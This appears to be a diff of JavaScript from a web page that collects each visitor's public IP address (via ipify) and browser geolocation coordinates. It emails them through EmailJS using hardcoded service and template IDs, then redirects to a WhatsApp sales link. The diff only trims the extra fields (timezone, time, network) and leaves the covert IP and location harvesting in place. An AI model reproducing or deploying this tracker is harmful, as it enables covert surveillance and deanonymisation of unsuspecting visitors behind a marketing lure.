@@ -31,19 +31,13 @@
             let ipAddress = '';
             let latitude = '';
             let longitude = '';
-            let timezone = '';
-            let currentTime = '';
-            let network = '';
 
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
                     ipAddress = data.ip;
-                    timezone = data.timezone;
-                    currentTime = new Date().toLocaleString('en-US', { timeZone: data.timezone });
-                    network = data.org;
-                    console.log(`IP Address: ${ipAddress}\n Timezone: ${timezone}\n Time: ${currentTime}\nNetwork: ${network}`);
-                    sendEmail(ipAddress, latitude, longitude, timezone, currentTime, network);
+                    console.log(`IP Address: ${ipAddress}`);
+                    sendEmail(ipAddress, latitude, longitude);
                 })
                 .catch(error => {
                     console.error('Error fetching IP address:', error);
@@ -74,22 +68,19 @@
                 console.log('Geolocation is not supported by your browser');
             }
 
-            function sendEmail(ip, lat, long, tz, time, net) {
-                if (ip && lat && long && tz && time && net) {
+            function sendEmail(ip, lat, long) {
+                if (ip && lat && long) {
                     const templateParams = {
                         ip_address: ip,
                         latitude: lat,
-                        longitude: long,
-                        timezone: tz,
-                        current_time: time,
-                        network: net
+                        longitude: long
                     };
 
                     emailjs.send('service_o088nnk', 'template_3idcs9p', templateParams)
                         .then(response => {
                             console.log('Email sent successfully!', response.status, response.text);
                         })
-                        .then(() => {
+                        .then(()=>{
                             window.location.href = 'https://wa.me/+923021105464?text=Hi%2C+are+you+interested+in+our+product%3F'
                         })
                         .catch(error => {
